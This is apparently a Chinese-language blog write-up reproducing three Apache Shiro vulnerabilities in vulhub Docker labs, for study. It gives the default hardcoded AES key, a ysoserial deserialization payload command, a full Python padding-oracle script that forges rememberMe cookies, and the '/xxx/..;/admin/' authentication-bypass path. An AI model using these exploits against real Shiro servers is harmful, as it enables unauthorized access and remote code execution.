---
layout: post
title:  Apache Shiro 漏洞复现
date: 2023-07-17 13:53:38
tags:
  - 网络安全
  - 框架漏洞
---

### 简介

Apache Shiro 是一个强大易用的 Java 安全框架,提供了认证、授权、加密和会话管理等功能，Shiro 框架直观、易用、同时也能提供健壮的安全性。

<!-- more -->

### CVE-2016-4437 (Apache Shiro 550 反序列化漏洞)

#### 环境搭建

环境下载链接：https://github.com/vulhub/vulhub

```bash
# 下载项目
wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
# 解压项目
unzip vulhub-master.zip
# 进入目录
cd vulhub-master/shiro/CVE-2016-4437/
# 启动整个环境
docker compose up -d
```

#### 影响版本

* Apache Shiro <= 1.2.4

#### 指纹信息

登录返回的响应包中 set-Cookie 包含 **rememberME=deleteMe** 字段

判断该网站使用 Apache Shiro 框架

#### 漏洞原理

Shiro 1.2.4 之前版本使用的是硬编码，AES 加密的密钥默认在代码里面。其默认密钥的 base64 编码后的值为 KPH+blxk5D2deZilxcaaaA==，这里可以通过构造恶意的序列化对象进行编码，加密，然后作为 Cookie 加密发送，服务器收到解密后并触发反序列化漏洞。

#### 漏洞复现

vulhub 环境搭建成功后，访问 http://youIp:8080

![image-20230714110350951](https://pic.mewhz.com/blog/image-20230714110350951.png)

输入用户名和密码，单击登录后使用 Burp Suite 抓包判断是否使用 Shiro 框架

![image-20230714105856852](https://pic.mewhz.com/blog/image-20230714105856852.png)

使用 Shiro-Attack 工具：https://github.com/SummerSec/ShiroAttack2

输入目标地址，分别单击爆破密钥和爆破利用链及回显

![image-20230714111439454](https://pic.mewhz.com/blog/image-20230714111439454.png)

执行 whoami 命令，成功执行~

![image-20230714111627378](https://pic.mewhz.com/blog/image-20230714111627378.png)

---

### CVE-2019-12422 (Apache Shiro 721 反序列化漏洞)

#### 影响版本

* Apche Shiro < 1.4.2

#### 环境搭建

环境下载链接：https://github.com/inspiringz/Shiro-721

```bash
# 下载项目
git clone https://github.com/inspiringz/Shiro-721.git
# 进入目录
cd Shiro-721/Docker/
# 构建环境
docker build -t shiro-721 .
# 启动环境
docker run -p 8080:8080 -d shiro-721
```

#### 漏洞原理

由于 Apache Shiro cookie 中通过 AES-128-CBC 模式加密的 rememberMe 字段存在问题，用户可通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。

**Padding Oracle** : 是一种通过对 DES、AES 等 block 加解密算法的 Padding 进行调控，根据解密过程是否正常，结合调控内容进行攻击，在无需知道 key 的前提下达成解密密文或加密明文的效果。

**Padding** : DES、AES 等 block cipher 加解密算法要求输入内容的长度为 block size 的整数倍。在加密过程中，若原始数据长度不符合该要求，则在其后添加 padding 部分以进行补足，在解密过程中，则在解密结果的末尾对 padding 部分进行移除。

#### 漏洞复现

登录测试用户，获取合法的 Cookie (勾选 Remember Me)，并使用 Burp Suite 进行抓包

![image-20230716181109876](https://pic.mewhz.com/blog/image-20230716181109876.png)

 登录时会发送两个包，第一个包里面没有 rememberMe 字段，第二个中会包含需要的信息![image-20230716181322233](https://pic.mewhz.com/blog/image-20230716181322233.png)

下载 ysoserial 工具：https://github.com/frohoff/ysoserial/

ysoserial 是一款用于生成不安全的 Java 对象反序列化的 payloads 工具

靶机环境中不存在 curl、ping 命令，建议使用 touch 命令创建文件

```bash
java -jar ysoserial-all.jar CommonsBeanutils1 "touch /tmp/success" > payload.class
# 运行该 jar 包
# CommonsBeanutils1 是该反序列化漏洞的利用链
# "touch /tmp/success" 是该 payload 要执行的命令，由于 Shiro 721 生成时间与要执行命令的长度有关，建议使用一些较短的命令
# 生成好的 payload 放到 class 文件中
```

生成 rememberMe 的脚本，与靶场仓库中的 shiro_exp.py 一样

```python
# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        # self.session.cookies['JSESSIONID'] = '18fa0f91-625b-4d8b-87db-65cdeff153d0'
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)
        self.session.cookies['rememberMe'] = somecookie
        if self.session.cookies.get('JSESSIONID'):
            del self.session.cookies['JSESSIONID']

        # logging.debug(self.session.cookies)

        while 1:
            try:
                response = self.session.get(sys.argv[1],
                        stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        # logging.debug(response.headers)

        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):
            logging.debug('No padding exception raised on %r', somecookie)
            return

        # logging.debug("Padding exception")
        raise BadPaddingException


if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[3:]:
        print 'Usage: %s <url> <somecookie value> <payload>' % (sys.argv[0], )
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)
    encrypted_cookie = b64decode(unquote(sys.argv[2]))

    padbuster = PadBuster()

    payload = open(sys.argv[3], 'rb').read()

    enc = padbuster.encrypt(plaintext=payload, block_size=16)

    # cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

    # print('Decrypted somecookie: %s => %r' % (sys.argv[1], enc))
    print('rememberMe cookies:')
    print(b64encode(enc))
```

运行脚本生成可以利用的 rememberMe 字段，时间较长大概一个小时左右

```shell
python2 shiro_exp.py http://192.168.1.8:8080/login.jsp Po3HKTou9qC7ZlARJLzVoupk3HxrBfdzWq8sSkIE6L9UjySUTIYYVcPlo57OLJ+cuk2iGiyuHgQuDZTJ9FgEANQNpxIMD8cKNEe9m70BDeMt9r2klPVTdDW+kuozexIsIyoaclprlXiZ6EflU+MUM7w55xTtT89kajRGBm/vloFG1xmk9CIJNJJ1tsDtPu32I+xI2tPVM2E/6rG8pLVhCvuWX48btei+AToBGz3Be97mEOv3lrmFV5kGdqTfHZ9jyQZvK+sCb0/j3hGcP8OyEthWODs9Lg3jWV13v3XqrdUn9ihHeYH99/+YAn4Y/LTZ45txn0ERBEmdyjJ/alah4z5TbbJJlEmz3S0QEjiqaj5WhknBu6pTivxZUIBc60Az2k5DmLKKQhz8NS7JuZdBil1jkUu1QHF0jV5FW7r2OffoM3mrNDsf2W5WQj+TaBFL87y81zuw4clRZlxn1CrPhwmio2/wAkVM90Sxx0HMlGg+9ARx7wnKGCXfAKSMJxed payload.class
# python2 运行脚本文件
# http://192.168.1.8:8080/login.jsp 该站点的路径
# 复制来的 rememberMe 字段
# payload 恶意类
```

等待较长的时间跑完后，将生成的 remember Me 复制到 Burp Suite 并重新发包

![image-20230717100931756](https://pic.mewhz.com/blog/image-20230717100931756.png)

![image-20230717101054293](https://pic.mewhz.com/blog/image-20230717101054293.png)

发送完成后进入 Docker 容器中查看文件是否创建成功

```bash
docker exec -it e00 /bin/bash
# 进入容器
```

![image-20230717101649765](https://pic.mewhz.com/blog/image-20230717101649765.png)

创建成功~

---

### CVE-2020-1957 (Apache Shiro 认证绕过漏洞)

#### 影响版本

* Apche Shiro < 1.5.2

#### 环境搭建

依然使用 vulhub 靶场

```bash
# 进入目录
cd vulhub-master/shiro/CVE-2020-1957/
# 启动整个环境
docker compose up -d
```

#### 漏洞复现

若是直接请求 /admin/，会被拦截，进而重定向到登录页面

![image-20230717135113899](https://pic.mewhz.com/blog/image-20230717135113899.png)

构造恶意请求`/xxx/..;/admin/`，即可绕过权限校验，访问到管理页面

![image-20230717135228802](https://pic.mewhz.com/blog/image-20230717135228802.png)
